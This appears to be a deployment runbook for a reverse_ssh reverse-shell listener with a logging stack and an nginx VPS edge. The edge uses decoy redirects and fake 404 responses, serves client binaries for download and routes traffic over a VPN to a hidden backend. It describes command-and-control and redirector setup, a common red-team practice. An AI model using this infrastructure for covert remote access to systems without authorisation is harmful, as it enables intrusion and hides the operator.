# Manual Deployment from a Clean Ubuntu Image

This runbook assumes fresh Ubuntu 22.04 LTS or 24.04 LTS servers.

Repository references:

- `reverse_logger`: <https://github.com/durck/reverse_logger>
- `reverse_ssh`: <https://github.com/durck/reverse_ssh>

Default WSS/HTTPS topology:

```text
external client -> VPS nginx :443 -> VPS SoftEther/internal route -> main internal IP:3232 -> reverse_ssh
```

For WSS/HTTPS public transports, nginx terminates public TLS on the VPS and
proxies only the configured transport paths to the same internal
`reverse_ssh` target. Raw DNAT remains a fallback for raw TCP-style exposure.

The main server does not need a SoftEther interface. It only needs a
private/internal address reachable from the VPS through the existing SoftEther
network path. SoftEther installation and account provisioning are intentionally
out of scope because they are handled before this runbook starts. This manual
runbook configures the main stack, the VPS nginx edge, TLS, and client
generation by hand. The Ansible playbook in `deploy/ansible/` is only an
optional automation path for the same VPS nginx edge.

Replace all example addresses, tokens, image names, and interface names before
applying commands.

## 1. Main Server Base Bootstrap

Run as a sudo-capable user on a clean main Ubuntu server:

```sh
sudo apt-get update
sudo apt-get upgrade -y
sudo apt-get install -y ca-certificates curl git gnupg openssh-client openssl sqlite3
```

Install Docker Engine and the Compose plugin from Docker's official apt
repository:

```sh
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc

sudo tee /etc/apt/sources.list.d/docker.sources >/dev/null <<EOF
Types: deb
URIs: https://download.docker.com/linux/ubuntu
Suites: $(. /etc/os-release && echo "${UBUNTU_CODENAME:-$VERSION_CODENAME}")
Components: stable
Architectures: $(dpkg --print-architecture)
Signed-By: /etc/apt/keyrings/docker.asc
EOF

sudo apt-get update
sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
sudo systemctl enable --now docker
sudo docker run --rm hello-world
```

Allow the deploy user to run Docker. The rest of this runbook uses `docker`
and `docker compose` without `sudo`.

```sh
sudo usermod -aG docker "$USER"
newgrp docker
docker info >/dev/null
docker compose version
```

If `docker info` still fails with a permission error, log out and back in, then
rerun the check.

## 2. Clone the Repository

```sh
sudo mkdir -p /opt/reverse-logger
sudo chown "$USER:$USER" /opt/reverse-logger
git clone https://github.com/durck/reverse_logger.git /opt/reverse-logger
```

For SSH-based deployment, use:

```sh
git clone git@github.com:durck/reverse_logger.git /opt/reverse-logger
```

## 3. Prepare Main Server Data and Env

```sh
sudo mkdir -p /opt/reverse-logger/data/reverse_ssh
sudo mkdir -p /opt/reverse-logger/data/logger
sudo chown -R "$USER:$USER" /opt/reverse-logger/data/reverse_ssh

cd /opt/reverse-logger
cp .env.example .env
chmod 600 .env
```

Generate deployment tokens:

```sh
WEBHOOK_TOKEN="$(openssl rand -hex 32)"
EDGE_FORWARD_TOKEN="$(openssl rand -hex 32)"
EDGE_HEALTH_TOKEN="$(openssl rand -hex 32)"
DASHBOARD_TOKEN="$(openssl rand -hex 32)"
printf 'WEBHOOK_TOKEN=%s\nEDGE_FORWARD_TOKEN=%s\nEDGE_HEALTH_TOKEN=%s\nDASHBOARD_TOKEN=%s\n' \
  "$WEBHOOK_TOKEN" "$EDGE_FORWARD_TOKEN" "$EDGE_HEALTH_TOKEN" "$DASHBOARD_TOKEN"
```

Generate the operator SSH key that will be seeded into `reverse_ssh`
`authorized_keys`. This is the key you will use when connecting through
`reverse_ssh`; it is not the SSH key used by Ansible to manage the VPS:

```sh
ssh-keygen -t ed25519 -a 100 -f ~/.ssh/reverse_ssh_operator -C "reverse_ssh_operator"
cat ~/.ssh/reverse_ssh_operator.pub
```

Keep the private key in your local `~/.ssh/` or a vault. Put only the single
public key line into `SEED_AUTHORIZED_KEYS`.

Generate a separate SSH key for the Docker session reconciler. This key is used
only by the `rssh-session-reconciler` sidecar to run `ls` against the internal
`reverse_ssh` console:

```sh
sudo install -d -m 0750 /opt/reverse-logger/secrets
sudo ssh-keygen -t ed25519 -a 100 \
  -f /opt/reverse-logger/secrets/rssh_session_reconciler \
  -C "rssh_session_reconciler"
sudo chmod 0600 /opt/reverse-logger/secrets/rssh_session_reconciler
sudo chmod 0644 /opt/reverse-logger/secrets/rssh_session_reconciler.pub
```

For a fresh deployment, add both public key lines to the initial
`authorized_keys` seed. For an existing deployment, do not rely on changing
`SEED_AUTHORIZED_KEYS`: `reverse_ssh` ignores it after `/data/authorized_keys`
has already been seeded. Append the reconciler public key instead:

```sh
sudo sh -c 'cat /opt/reverse-logger/secrets/rssh_session_reconciler.pub >> /opt/reverse-logger/data/reverse_ssh/authorized_keys'
```

Edit `.env`:

```sh
nano .env
```

Set at minimum:

- `REVERSE_SSH_BIND_IP`: private/internal main-server address reachable from
  the VPS.
- `REVERSE_SSH_BIND_PORT`: internal target port, normally `3232`.
- `REVERSE_SSH_EXTERNAL_ADDRESS`: public VPS entrypoint, for example
  `vps-entrypoint.example.com:443`.
- `REVERSE_SSH_PUBLIC_PORT`: public VPS entrypoint port, normally `443`. For
  nginx WSS/HTTPS this is the public nginx port; for the raw DNAT fallback,
  keep it aligned with the VPS DNAT `PUBLIC_PORT`.
- `REVERSE_SSH_WS_PATH` / `REVERSE_SSH_PUSH_PATH`: listener web transport
  paths. Keep them aligned with nginx, `nginx-edge-forwarder`, central
  `INGRESS_WS_PATH` / `INGRESS_PUSH_PATH`, and generated clients.
- `REVERSE_SSH_TRUSTED_PROXY_CIDR`: set this to the trusted nginx/VPN source
  CIDR, for example `<vps_internal_ip>/32`, when nginx terminates TLS and
  forwards real-IP headers.
- `REVERSE_SSH_IMAGE`: local Docker image tag for your custom `reverse_ssh`
  build, normally `reverse-ssh:local`.
- `REVERSE_SSH_REPO_URL`: optional repository URL to clone automatically.
- `REVERSE_SSH_SOURCE_DIR`: local path for a manually cloned or
  automatically cloned `reverse_ssh` repository.
- `SEED_AUTHORIZED_KEYS`: `reverse_ssh` operator public key contents, not a
  file path and not the private key.
- `WEBHOOK_TOKEN`: first generated token.
- `EDGE_FORWARD_TOKEN`: second generated token used by VPS nginx edge
  forwarders for central ingress events.
- `RSSH_SESSION_FORWARD_TOKEN`: token used by the Docker session reconciler.
  It may match `EDGE_FORWARD_TOKEN`, but separate rotation is cleaner.
- `RSSH_SESSION_CONSOLE_KEY_PATH`: host path to the reconciler private key,
  normally `/opt/reverse-logger/secrets/rssh_session_reconciler`.
- `RSSH_SESSION_INTERVAL` / `RSSH_SESSION_TIMEOUT`: reconciler poll interval
  and per-iteration timeout.
- `RSSH_SESSION_CONSOLE_COMMAND_DELAY`: startup delay before sending the first
  interactive `reverse_ssh` console command. After that the reconciler waits
  for parseable `ls` output until `RSSH_SESSION_TIMEOUT`.
- `EDGE_HEALTH_TOKEN`: token used by VPS health reporters. Keep it separate
  from `EDGE_FORWARD_TOKEN` so ingress forwarding and health reporting can be
  rotated independently.
- `DASHBOARD_TOKEN`: optional read-only dashboard token. Leave it empty to
  disable `/dashboard`. Browser access uses HTTP Basic Auth with any username
  and this value as the password.
- `LOGGER_BIND_IP` / `LOGGER_BIND_PORT`: host bind for central ingress
  forwarding and optional dashboard access. Keep `LOGGER_BIND_IP=127.0.0.1`
  for SSH tunnel access, or set the main private/interface IP and restrict
  `LOGGER_BIND_PORT` with firewall allowlists.
- `INGRESS_WS_PATH` / `INGRESS_PUSH_PATH`: central validation paths for nginx
  ingress events. Keep them aligned with VPS nginx and `nginx-edge-forwarder`
  `RSSH_WS_PATH` / `RSSH_PUSH_PATH`; defaults are `/ws` and `/push`.
- `CORRELATION_*`: optional time windows and fallback switches for matching
  ingress events to webhooks. Defaults handle normal request ordering; increase
  the windows if VPS/main clocks or forwarding delays differ.
- `TELEGRAM_*` settings and `TELEGRAM_PROXY_URL` if alerts are enabled.

## 4. Build the reverse_ssh Image Locally

If you want the helper to clone the repository, set `REVERSE_SSH_REPO_URL` in
`.env` first:

```text
REVERSE_SSH_REPO_URL=https://github.com/durck/reverse_ssh.git
REVERSE_SSH_REPO_REF=main
REVERSE_SSH_SOURCE_DIR=/opt/reverse-logger/src/reverse_ssh
REVERSE_SSH_IMAGE=reverse-ssh:local
```

If you prefer to clone manually, leave `REVERSE_SSH_REPO_URL` empty and clone
the repository to `REVERSE_SSH_SOURCE_DIR`:

```sh
mkdir -p /opt/reverse-logger/src
git clone https://github.com/durck/reverse_ssh.git /opt/reverse-logger/src/reverse_ssh
```

Build the local image:

```sh
cd /opt/reverse-logger
set -a
. ./.env
set +a
sh deploy/docker/build-reverse-ssh-image.sh
docker image inspect "$REVERSE_SSH_IMAGE" >/dev/null
```

The build helper expects the `reverse_ssh` repository to contain a Dockerfile.
If the Dockerfile is in a custom location, set `REVERSE_SSH_DOCKERFILE` and
`REVERSE_SSH_BUILD_CONTEXT` in `.env`.

## 5. Start the Main Stack

```sh
cd /opt/reverse-logger
docker compose build rssh-logger rssh-session-reconciler
```

Both services build the same `reverse-logger/rssh-logger:local` image. Listing
both keeps targeted sidecar rebuilds from accidentally reusing an older image.

`rssh-logger` runs as the unprivileged `app` user inside its container. The
host bind mount for `LOGGER_DATA_DIR` must be writable by that container user;
otherwise SQLite may fail at startup with `unable to open database file: out of
memory (14)`.

Set the logger data directory owner to the UID/GID from the built image:

```sh
set -a
. ./.env
set +a

LOGGER_DIR="${LOGGER_DATA_DIR:-/opt/reverse-logger/data/logger}"
APP_UID="$(docker compose run --rm --no-deps --entrypoint sh rssh-logger -c 'id -u' | tr -d '\r')"
APP_GID="$(docker compose run --rm --no-deps --entrypoint sh rssh-logger -c 'id -g' | tr -d '\r')"

sudo mkdir -p "$LOGGER_DIR"
sudo chown -R "$APP_UID:$APP_GID" "$LOGGER_DIR"
sudo chmod 750 "$LOGGER_DIR"
```

Start the stack. For the nginx WSS/HTTPS VPS edge path, include
`docker-compose.edge-forward.yml`; otherwise the central `rssh-logger` is only
reachable inside the Docker network and the VPS `nginx-edge-forwarder` cannot
POST ingress events to it:

```sh
docker compose \
  --env-file .env \
  -f docker-compose.yml \
  -f docker-compose.edge-forward.yml \
  up -d
docker compose \
  --env-file .env \
  -f docker-compose.yml \
  -f docker-compose.edge-forward.yml \
  ps
```

Keep this exact ordered file set for later `config`, `up`, `ps`, `logs`,
`restart`, and `down` operations. `docker-compose.edge-forward.yml` is not an
automatically loaded override. Recreating `rssh-logger` with only the base file
removes its host port publication and breaks VPS ingress/health delivery.

Current shell variables take precedence over `.env`, including with
`--env-file .env`. If `.env` was previously sourced with `set -a`, either open
a fresh shell or unset the project variables before Compose interpolation.
`set +a` alone does not unset them. A parent-shell-safe check is:

```bash
(
  while IFS= read -r name; do
    unset "$name"
  done < <(sed -nE 's/^[[:space:]]*(export[[:space:]]+)?([A-Za-z_][A-Za-z0-9_]*)=.*/\2/p' .env)

  docker compose \
    --env-file .env \
    -f docker-compose.yml \
    -f docker-compose.edge-forward.yml \
    config --environment
)
```

This publishes `rssh-logger` on `LOGGER_BIND_IP:LOGGER_BIND_PORT`:

```text
http://<LOGGER_BIND_IP>:<LOGGER_BIND_PORT>/ingress-events
```

With `LOGGER_BIND_IP=192.0.2.10`, the VPS forwarder should use:

```text
NGINX_EDGE_FORWARD_URL=http://192.0.2.10:8080/ingress-events
```

If you are not using VPS ingress forwarding, plain `docker compose up -d` is
enough.

When `DASHBOARD_TOKEN` is set, the read-only dashboard is available on the same
published logger endpoint:

```text
http://<LOGGER_BIND_IP>:<LOGGER_BIND_PORT>/dashboard/
```

Connection events are on a separate page:

```text
http://<LOGGER_BIND_IP>:<LOGGER_BIND_PORT>/dashboard/connections
```

Use HTTP Basic Auth in the browser: any username, and `DASHBOARD_TOKEN` as the
password. For localhost-only access, keep `LOGGER_BIND_IP=127.0.0.1` and open
an SSH tunnel from your workstation:

```sh
ssh -L 18080:127.0.0.1:8080 <main-user>@<main-host>
```

Then open:

```text
http://127.0.0.1:18080/dashboard/
```

Do not expose `/dashboard` through the public VPS nginx endpoint.

The Docker entrypoint starts the `reverse_ssh` listener from `.env`. With the
default paths, it is equivalent to:

```sh
./server \
  --datadir /data \
  --enable-client-downloads \
  --tls \
  --external_address "$REVERSE_SSH_EXTERNAL_ADDRESS" \
  --ws-path "$REVERSE_SSH_WS_PATH" \
  --push-path "$REVERSE_SSH_PUSH_PATH" \
  :2222
```

When `REVERSE_SSH_TRUSTED_PROXY_CIDR` is set, the entrypoint also adds:

```sh
--trusted-proxy-cidr "$REVERSE_SSH_TRUSTED_PROXY_CIDR"
```

The `reverse_ssh` listener must be bound only to the internal address, for
example:

```text
192.0.2.10:3232 -> reverse_ssh:2222
```

Do not bind it to `0.0.0.0` unless you explicitly want direct public exposure
from the main server.

## 6. Connect to reverse_ssh and Register Webhook

Follow this sequence after the Compose stack is running. This prepares the
catcher console and webhook registration only. Generate public WSS/HTTPS
clients after the VPS entrypoint is configured in later steps.

### 6.1 Load the deployment environment

Run on the main server:

```sh
cd /opt/reverse-logger
set -a
. ./.env
set +a
```

### 6.2 Connect to the catcher console

The `SEED_AUTHORIZED_KEYS` value from `.env` authorizes the operator SSH key
for the `reverse_ssh` server console. From the main server, or from any
workstation that can route to `REVERSE_SSH_BIND_IP:REVERSE_SSH_BIND_PORT`,
connect to the catcher console:

```sh
ssh -i ~/.ssh/reverse_ssh_operator \
  -p "${REVERSE_SSH_BIND_PORT:-3232}" \
  "$REVERSE_SSH_BIND_IP"
```

If your workstation cannot reach the internal bind address directly, connect
from the main server shell or create a normal SSH tunnel to the main server
first:

```sh
ssh -L 3232:<REVERSE_SSH_BIND_IP>:<REVERSE_SSH_BIND_PORT> <admin>@<main-server>
ssh -i ~/.ssh/reverse_ssh_operator -p 3232 127.0.0.1
```

Do not use plain OpenSSH against the public `wss://` or `https://` nginx
entrypoint. That public endpoint is for generated `reverse_ssh` clients; the
operator console is the SSH service exposed by the `reverse_ssh` server on its
internal bind address.

### 6.3 Register the logger webhook

Run inside the catcher console:

```text
webhook --on http://rssh-logger:8080/hooks/<WEBHOOK_TOKEN>
webhook -l
```

Use the exact token from `.env`. The lifecycle URL must use private Docker DNS
and the container port. Do not replace it with
`http://<main-public-ip>:8080/hooks/...`: that host-published path is for VPS
forwarders and may fail from a sibling container because of firewall or
hairpin-routing policy.

Verify reachability from the actual caller:

```sh
docker compose exec reverse_ssh sh -lc \
  'wget -qO- http://rssh-logger:8080/healthz || curl -fsS http://rssh-logger:8080/healthz'
```

Run `webhook -l` after every `reverse_ssh` container/image replacement. Treat
the registration as runtime state unless that deployed `reverse_ssh` version
explicitly guarantees persistence. Redact the URL token from screenshots; if
it is disclosed, rotate `WEBHOOK_TOKEN`, force-recreate `rssh-logger` with both
Compose files, and replace the registered URL.

## 7. VPS Base Bootstrap

Run on each clean Ubuntu VPS that will accept public `80/tcp` and `443/tcp`:

```sh
sudo apt-get update
sudo apt-get upgrade -y
sudo DEBIAN_FRONTEND=noninteractive apt-get install -y \
  ca-certificates curl git iproute2 iptables iptables-persistent \
  netcat-openbsd netfilter-persistent tcpdump
```

Enable IPv4 forwarding:

```sh
sudo tee /etc/sysctl.d/99-reverse-logger-forwarding.conf >/dev/null <<EOF
net.ipv4.ip_forward=1
EOF
sudo sysctl --system
```

SoftEther provisioning is handled outside this runbook. After the existing
automation has prepared the VPS, verify the VPN interface, routes, and target
reachability:

```sh
ip -br addr
ip route
nc -vz 192.0.2.10 3232
nc -vz 192.0.2.10 8080
```

In the examples below, `vpn_softether` is the VPS SoftEther interface and
`192.0.2.10:3232` is the main `reverse_ssh` target.
`192.0.2.10:8080` is the central `rssh-logger` ingress endpoint exposed by
`docker-compose.edge-forward.yml`.

## 8. Deploy Nginx WSS/HTTPS VPS Entrypoint

This is the normal next step for the WSS/HTTPS setup after VPS tooling and
SoftEther reachability are ready. Nginx accepts public `443/tcp`, terminates
TLS, filters the public WSS/HTTPS paths, logs ingress, and proxies matching
transport requests to the internal `reverse_ssh` listener.

Do not apply the raw DNAT fallback from step 9 for this mode. The nginx route
uses `proxy_pass` to the internal `reverse_ssh` target instead of public-port
DNAT.

Run the remaining commands in this step on the VPS.

Install nginx, Go, Snap, and Certbot:

```sh
sudo apt-get update
sudo DEBIAN_FRONTEND=noninteractive apt-get install -y nginx golang-go snapd
sudo snap install core
sudo snap refresh core
sudo snap install --classic certbot
sudo ln -sf /snap/bin/certbot /usr/bin/certbot
```

If you plan to issue certificates with Timeweb DNS-01 instead of HTTP-01,
install the DNS plugin as well:

```sh
sudo snap install certbot-dns-multi
sudo snap set certbot trust-plugin-with-root=ok
sudo snap connect certbot:plugin certbot-dns-multi
```

Clone this repository on the VPS:

```sh
sudo mkdir -p /opt/reverse-logger
sudo chown "$USER:$USER" /opt/reverse-logger
git clone https://github.com/durck/reverse_logger.git /opt/reverse-logger
cd /opt/reverse-logger
```

Install the edge forwarder:

```sh
go build -trimpath -ldflags="-s -w" -o /tmp/nginx-edge-forwarder ./cmd/nginx-edge-forwarder
sudo install -m 0755 /tmp/nginx-edge-forwarder /usr/local/bin/nginx-edge-forwarder
go build -trimpath -ldflags="-s -w" -o /tmp/edge-health ./cmd/edge-health
sudo install -m 0755 /tmp/edge-health /usr/local/bin/edge-health
```

Create the forwarder config and edit all VPS-specific values:

```sh
sudo mkdir -p /etc/reverse-logger
sudo cp deploy/systemd/nginx-edge-forwarder.env.example /etc/reverse-logger/nginx-edge-forwarder.env
sudo cp deploy/systemd/edge-health.env.example /etc/reverse-logger/edge-health.env
sudo nano /etc/reverse-logger/nginx-edge-forwarder.env
sudo nano /etc/reverse-logger/edge-health.env
```

Set at minimum:

- `NGINX_EDGE_FORWARD_URL`: central ingress URL, normally
  `http://<LOGGER_BIND_IP>:<LOGGER_BIND_PORT>/ingress-events`.
- `EDGE_FORWARD_TOKEN`: `EDGE_FORWARD_TOKEN` from the main `.env`.
- `VPS_NAME`, `VPS_PUBLIC_IP`, `VPS_INTERNAL_IP`.
- `RSSH_WS_PATH` and `RSSH_PUSH_PATH`, matching the main `.env`.

For `edge-health.env`, set at minimum:

- `EDGE_HEALTH_FORWARD_URL`: central health URL, normally
  `http://<LOGGER_BIND_IP>:<LOGGER_BIND_PORT>/edge-health`.
- `EDGE_HEALTH_TOKEN`: `EDGE_HEALTH_TOKEN` from the main `.env`.
- `EDGE_HEALTH_REVERSE_SSH_ADDR`:
  `<REVERSE_SSH_BIND_IP>:<REVERSE_SSH_BIND_PORT>`.
- `EDGE_HEALTH_LOGGER_HEALTH_URL`:
  `http://<LOGGER_BIND_IP>:<LOGGER_BIND_PORT>/healthz`.
- `EDGE_HEALTH_VPN_IFACE`: SoftEther interface, for example `vpn_softether`;
  leave empty when VPS edges reach main directly over the public Internet.
- `EDGE_HEALTH_SYSTEMD_SERVICES`: comma-separated local services to verify,
  normally `nginx,nginx-edge-forwarder`; leave empty to monitor only
  main port and health endpoint availability.

`VPS_INTERNAL_IP` should be the source IP observed by the main server, not the
VPS interface address. You can read it from the main logger by calling
`/edge/source-ip/<EDGE_FORWARD_TOKEN>` from the VPS. The central logger also
records the observed source IP of the forwarder request as `forwarder_ip` and
uses it as a correlation fallback.

Install the systemd unit, but start it only after nginx is configured:

```sh
sudo cp deploy/systemd/nginx-edge-forwarder.service /etc/systemd/system/nginx-edge-forwarder.service
sudo cp deploy/systemd/edge-health.service /etc/systemd/system/edge-health.service
sudo mkdir -p /var/lib/reverse-logger/nginx-edge-spool
sudo chmod 750 /var/lib/reverse-logger /var/lib/reverse-logger/nginx-edge-spool
sudo systemctl daemon-reload
```

The unit also declares `StateDirectory=` for the same paths, so a fresh
`systemctl enable --now nginx-edge-forwarder` creates them when the explicit
`mkdir` step was skipped. Without either step, startup fails with
`226/NAMESPACE` because `ReadWritePaths` requires an existing directory.

For HTTP-01 only, create the ACME webroot and apply the temporary HTTP-only
nginx config:

```sh
sudo mkdir -p /var/www/letsencrypt
sudo cp deploy/nginx/rssh-acme-bootstrap.conf.example \
  /etc/nginx/sites-available/rssh-entrypoint.conf
sudo ln -sf /etc/nginx/sites-available/rssh-entrypoint.conf \
  /etc/nginx/sites-enabled/rssh-entrypoint.conf
sudo rm -f /etc/nginx/sites-enabled/default
sudo nano /etc/nginx/sites-available/rssh-entrypoint.conf
sudo nginx -t
sudo systemctl enable --now nginx
sudo systemctl reload nginx
```

In the bootstrap config, set:

- `server_name` to the public FQDN whose A record points at this VPS.
- `return 301 ...` to the decoy `redirect_target`.

Issue the Let's Encrypt certificate with HTTP-01 webroot validation:

```sh
sudo certbot certonly --webroot \
  --cert-name <rssh_domain> \
  -w /var/www/letsencrypt \
  -d <rssh_domain> \
  --email <admin_email> \
  --agree-tos \
  --non-interactive \
  --keep-until-expiring
```

For Timeweb DNS-01, skip the HTTP bootstrap config and create the DNS plugin
credentials file instead:

```sh
sudo install -m 0600 /dev/null /etc/letsencrypt/dns-multi.ini
sudo tee /etc/letsencrypt/dns-multi.ini >/dev/null <<'EOF'
dns_multi_provider = timewebcloud
TIMEWEBCLOUD_AUTH_TOKEN = "<Timeweb Cloud API token>"
TIMEWEBCLOUD_PROPAGATION_TIMEOUT = 120
TIMEWEBCLOUD_POLLING_INTERVAL = 5
EOF
sudo chmod 0600 /etc/letsencrypt/dns-multi.ini
```

Then issue the certificate through DNS-01:

```sh
sudo certbot certonly \
  --cert-name <rssh_domain> \
  -a dns-multi \
  --dns-multi-credentials /etc/letsencrypt/dns-multi.ini \
  --preferred-challenges dns \
  -d <rssh_domain> \
  --email <admin_email> \
  --agree-tos \
  --non-interactive \
  --keep-until-expiring
```

For Ansible-managed hosts you can keep `nginx_edge_acme_challenge: http-01`
and still provide `timewebcloud_auth_token`. When HTTP-01 times out or fails,
the playbook automatically retries with Timeweb DNS-01 if
`nginx_edge_acme_http01_fallback_to_dns_timeweb: true`.

The Ansible HTTP-01 path also performs a preflight before certbot: it writes a
temporary file into
`/var/www/letsencrypt/.well-known/acme-challenge/` and fetches it through
`http://<rssh_domain>/.well-known/acme-challenge/<token>` from the control
node. A generic URL such as `/test` is expected to return `404` unless that
exact file exists; the useful signal is whether a created challenge file returns
`200` with the expected body.

For Ansible-managed ACME, keep nginx `tls_cert_path` and `tls_key_path` aligned
with the certbot lineage selected by `nginx_edge_acme_cert_name`, normally
`/etc/letsencrypt/live/<rssh_domain>/fullchain.pem` and
`/etc/letsencrypt/live/<rssh_domain>/privkey.pem`. Arbitrary custom TLS paths
are only for non-ACME deployments where those files already exist.

If you are migrating an existing HTTP-01 certificate and need to reissue it
immediately through DNS-01, replace `--keep-until-expiring` with
`--force-renewal` for that one run. Keep the Timeweb token out of shell history
and do not commit `/etc/letsencrypt/dns-multi.ini` or copied credentials.

Install a renewal hook so nginx reloads after certificate renewal:

```sh
sudo mkdir -p /etc/letsencrypt/renewal-hooks/deploy
sudo tee /etc/letsencrypt/renewal-hooks/deploy/reload-nginx.sh >/dev/null <<'EOF'
#!/bin/sh
set -eu
nginx -t
systemctl reload nginx
EOF
sudo chmod 0755 /etc/letsencrypt/renewal-hooks/deploy/reload-nginx.sh
```

Apply the final HTTPS entrypoint config:

```sh
sudo cp deploy/nginx/rssh-wss-https-entrypoint.conf.example \
  /etc/nginx/sites-available/rssh-entrypoint.conf
sudo nano /etc/nginx/sites-available/rssh-entrypoint.conf
sudo nginx -t
sudo systemctl reload nginx
sudo systemctl enable --now nginx-edge-forwarder
sudo systemctl enable --now edge-health
```

In the final config, set:

- every `server_name` to `rssh_domain`;
- `ssl_certificate` and `ssl_certificate_key` to
  `/etc/letsencrypt/live/<rssh_domain>/fullchain.pem` and
  `/etc/letsencrypt/live/<rssh_domain>/privkey.pem`;
- every `proxy_pass https://192.0.2.10:3232` to the main internal
  `reverse_ssh` listener;
- every decoy redirect to `redirect_target`;
- `/ws`, `/push`, and `/push/` plus the top `map` rules if custom public paths
  are used;
- `/dl/` so public `/dl/<filename>` is proxied to backend `/<filename>` for
  `link --name <filename>`
- `proxy_buffering off` on `/dl/` for large chunked client binaries

Verify the VPS edge:

```sh
sudo systemctl status nginx nginx-edge-forwarder --no-pager
sudo journalctl -u nginx-edge-forwarder -n 100 --no-pager
sudo tail -n 20 /var/log/nginx/reverse_ssh_ingress.json
curl -I http://<rssh_domain>/.well-known/acme-challenge/test || true
```

From any external host, verify TLS and the decoy redirect:

```sh
openssl s_client -connect <rssh_domain>:443 -servername <rssh_domain> </dev/null
curl -I https://<rssh_domain>/not-a-transport-path
curl -I https://<rssh_domain>/dl/not-a-real-link
```

The first command should redirect to `redirect_target`. The second should reach
`reverse_ssh` and return a fake nginx 404 for an unknown download name.

This manual flow requires an existing A record pointing `rssh_domain` at the
VPS, open `443/tcp`, SoftEther/internal reachability to the main `reverse_ssh`
listener, and an email for Let's Encrypt. HTTP-01 also requires open `80/tcp`.
Timeweb DNS-01 requires DNS hosting on Timeweb-compatible nameservers plus a
Timeweb Cloud API token that can edit records for the zone. PTR is useful for
operations hygiene but is not used for ACME validation. Wildcard certificates
require DNS-01.

Keep these values identical across the stack:

- nginx public `rssh_ws_path` / `rssh_push_path`;
- VPS forwarder `RSSH_WS_PATH` / `RSSH_PUSH_PATH`;
- central logger `INGRESS_WS_PATH` / `INGRESS_PUSH_PATH`;
- main `reverse_ssh` listener `REVERSE_SSH_WS_PATH` /
  `REVERSE_SSH_PUSH_PATH`;
- generated clients from `link --ws-path` / `link --push-path`;
- download URLs from `link --name <filename>`, served publicly as
  `/dl/<filename>` when nginx uses the default download prefix.

Use absolute base paths without a trailing slash, for example `/ws`,
`/rssh-ws`, `/push`, `/rssh-push`, or `/dl`.

When nginx is in front of `reverse_ssh`, set
`REVERSE_SSH_TRUSTED_PROXY_CIDR=<main-observed-vps-source-ip>/32` or a narrower
CIDR that contains only trusted VPS nginx sources, then recreate the
`reverse_ssh` container. The nginx route overwrites `X-Real-IP` and
`X-Forwarded-For` with `$remote_addr`; do not accept those headers from
untrusted sources.

Do not run `certbot --nginx` against this entrypoint because this repository's
template owns the nginx configuration. If you later want the same nginx edge
rollout automated, use [../deploy/ansible/README.md](../deploy/ansible/README.md).

## 9. Optional Raw DNAT Fallback

Use this step only when you intentionally want the VPS to forward public
`443/tcp` directly to the main `reverse_ssh` listener at the TCP layer. This is
not the nginx WSS/HTTPS edge path.

Clone the repository on the VPS or copy only `deploy/iptables/vps-forward.sh`
from the main server:

```sh
sudo mkdir -p /opt/reverse-logger
sudo chown "$USER:$USER" /opt/reverse-logger
git clone https://github.com/durck/reverse_logger.git /opt/reverse-logger
```

Apply DNAT:

```sh
sudo env \
  PUBLIC_IFACE=eth0 \
  VPN_IFACE=vpn_softether \
  PUBLIC_PORT=443 \
  RSSH_TARGET_IP=192.0.2.10 \
  RSSH_TARGET_PORT=3232 \
  sh /opt/reverse-logger/deploy/iptables/vps-forward.sh
```

Leave `SNAT_SOURCE_IP` unset by default. If replies cannot route back through
the VPS, rerun with `SNAT_SOURCE_IP=<VPS_SOFTETHER_IP>` and accept that webhook
`ip_raw` will show the VPS/VPN source address.

If you changed `REVERSE_SSH_PUBLIC_PORT` in the main `.env`, pass the same
value as `PUBLIC_PORT` here. The script also accepts exported
`REVERSE_SSH_PUBLIC_PORT` as a fallback when `PUBLIC_PORT` is unset.

Persist the applied iptables rules after validation:

```sh
sudo netfilter-persistent save
sudo systemctl enable netfilter-persistent
```

Open only `80/tcp` and `443/tcp` on the public VPS firewall or cloud firewall.
Port `80/tcp` is required for Let's Encrypt HTTP-01 validation and may redirect
all non-ACME traffic. Restrict SSH and management access separately.

See [softether-entrypoint.md](softether-entrypoint.md) for additional DNAT and
SNAT notes.

## 10. Optional Main Ingress Guard

Apply a default-deny policy on the main server's internal ingress interface if
that network also carries traffic from untrusted sources. This is not a
SoftEther interface on the main server; it is the normal interface where the
VPS-routed traffic arrives.

First read [Main Server Firewall](firewall.md). Docker-published ports may
traverse `DOCKER-USER`, so a UFW `INPUT` allowlist alone is not a complete
Docker boundary. Conversely, do not add UFW rules for generated `br-<hash>`
interfaces: Compose bridge names can change and the internal webhook does not
use the host-published port.

The provided `main-firewall.sh` ends its managed chain with an unconditional
drop. Use it only on a dedicated ingress interface. If the same interface also
carries administrative SSH or other services, use the port-scoped
`DOCKER-USER` pattern in `docs/firewall.md` instead.

In the raw DNAT-only path, do not set a source allowlist here: the main server
sees the real internet client IP, not the VPS VPN IP. In the nginx WSS/HTTPS
path, the backend sees trusted nginx proxy headers only when
`REVERSE_SSH_TRUSTED_PROXY_CIDR` is set on the main `reverse_ssh` listener.

```sh
sudo env \
  INGRESS_IFACE=eth0 \
  REVERSE_SSH_BIND_IP=192.0.2.10 \
  REVERSE_SSH_PORT=3232 \
  LOGGER_BIND_IP=192.0.2.10 \
  LOGGER_BIND_PORT=8080 \
  ALLOWED_SOURCE_IPS='<vps-1-ip> <vps-2-ip>' \
  sh /opt/reverse-logger/deploy/iptables/main-firewall.sh
```

If centralized edge-event forwarding or interface-bound dashboard access is
enabled, add `LOGGER_BIND_IP=<main-interface-ip>` and `LOGGER_BIND_PORT=8080`
so the same path may also reach the central logger. If VPS forwarding uses
`SNAT_SOURCE_IP`, you may additionally set `ALLOWED_SOURCE_IPS` to those SNAT
source addresses. If dashboard access uses the same interface, include only
your operator IP/VPN source plus the VPS edge sources that need
`/ingress-events`.

With UFW, insert future VPS allow rules before existing terminal denies. A
plain appended `ufw allow` may be shadowed by an earlier deny:

```sh
sudo ufw insert 1 allow proto tcp \
  from <new-vps-ip> to <main-bind-ip> port <reverse-ssh-host-port> \
  comment 'reverse_ssh from new VPS edge'
sudo ufw insert 1 allow proto tcp \
  from <new-vps-ip> to <main-bind-ip> port 8080 \
  comment 'logger ingest from new VPS edge'
sudo ufw status numbered
```

Verify after applying:

```sh
sudo iptables -S RSSH_INGRESS_GUARD
sudo iptables -S INPUT | grep RSSH_INGRESS_GUARD
